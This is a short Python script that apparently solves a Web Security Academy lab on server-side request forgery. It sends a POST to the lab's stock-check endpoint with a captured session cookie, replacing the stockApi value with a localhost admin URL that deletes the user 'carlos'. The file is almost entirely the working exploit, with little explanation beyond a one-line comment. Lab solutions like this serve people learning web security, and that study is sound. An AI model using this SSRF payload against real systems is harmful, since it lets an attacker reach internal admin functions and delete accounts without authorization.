import requests

# URL endpoint
url = "https://0a9300d603e2e1ac821d105800ea000c.web-security-academy.net/product/stock"

# Headers
headers = {
    "Cookie": "session=cKRMOEeF4Koz3Mn3MoWfvzPbmMSbzjvZ",
    "Sec-Ch-Ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    "Content-Type": "application/x-www-form-urlencoded",
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Sec-Ch-Ua-Platform": '"Linux"',
    "Accept": "*/*",
    "Origin": "https://0a9300d603e2e1ac821d105800ea000c.web-security-academy.net",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://0a9300d603e2e1ac821d105800ea000c.web-security-academy.net/product?productId=1",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "Priority": "u=1, i"
}

# Data payload
'''
i changed the vuln ssrf , this the body request before
stockApi : http://api/stock/xxxxxxx
'''
data = {
    "stockApi": "http://localhost/admin/delete?username=carlos"
}

response = requests.post(url, headers=headers, data=data)

# Print the response (status code and body)
print(f"Status Code: {response.status_code}")
print(f"Response Body: {response.text}")
